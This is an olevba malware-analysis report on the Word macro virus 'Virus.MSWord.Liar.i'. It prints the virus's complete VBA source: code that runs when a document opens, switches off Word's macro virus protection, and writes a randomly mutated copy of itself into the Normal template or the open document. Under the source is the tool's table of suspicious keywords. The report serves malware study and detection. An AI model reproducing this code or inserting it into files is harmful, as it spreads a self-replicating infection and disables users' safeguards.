olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Liar.i - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Class.Beg to differ

Private Sub Document_Open() '

Dim v(200): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '

Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '

Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '

If MacroContainer = s Then Set s = ActiveDocument '

Set nh = s.VBProject.VBComponents(1).CodeModule: li = abc.countoflines: y = 100 + Int(Rnd * 50) '

For i = 1 To li: jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '

If p = 1 And li > y Then '

d = 1: GoTo n_ '

End If '

l = UCase(Left(abc.Lines(i, 1), (p - 1))) '

For o = 1 To Len(l): f = Mid(l, o, 1) '

If Asc(f) < 90 And Asc(f) > 65 Then f = Chr(Asc(f) + Int(Rnd * 2) * 32) '

v(i) = v(i) & f: Next o '

For j = 1 To Int(75 - (Rnd * 20)): jc = jc & Chr(255 - Int(Rnd * 100)): Next j '

v(i) = v(i) & t & jc '

If d = 2 Then v(i) = v(i) & vbCr & t & jc '

vc = vc & v(i) & vbCr '

n_: '

Next i '

If nh.countoflines < (1 + 1 + 2) Then '

nh.deletelines 1, nh.countoflines: nh.addfromstring vc: nh.deletelines nh.countoflines, 1 '

If s = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName '

If Day(Now()) = 16 Then beg_to_differ '

End If '

End Sub '

Private Sub beg_to_differ() '

beg = "do you see what I see?" & vbCr '

beg = beg & "do you hear what I hear?" & vbCr '

beg = beg & "do you feel what I feel?" & vbCr '

beg = beg & "do you ever care?" & vbCr '

beg = beg & "I...beg to differ!" & vbCr '

beg = beg & "beg to differ!" & vbCr & vbCr '

beg = beg & "jackie twoflower/Lz0NT/MVT" '

MsgBox beg, 0, "class.beg to differ" '

End Sub '

Rem Dedicated to Darkman/29A '
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

